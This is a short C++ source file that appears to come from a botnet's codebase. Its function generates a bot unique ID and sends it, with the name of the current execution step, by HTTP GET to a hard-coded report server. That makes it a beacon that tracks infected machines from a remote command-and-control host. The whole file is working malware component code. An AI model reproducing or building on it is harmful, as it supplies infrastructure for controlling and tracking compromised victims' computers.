#include "BotCore.h"
#include "DbgRpt.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace DBGRPTDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>

void DebugReportStepByName(const char* StepName)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportStepByName", "go to url='%s'\r\n", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}
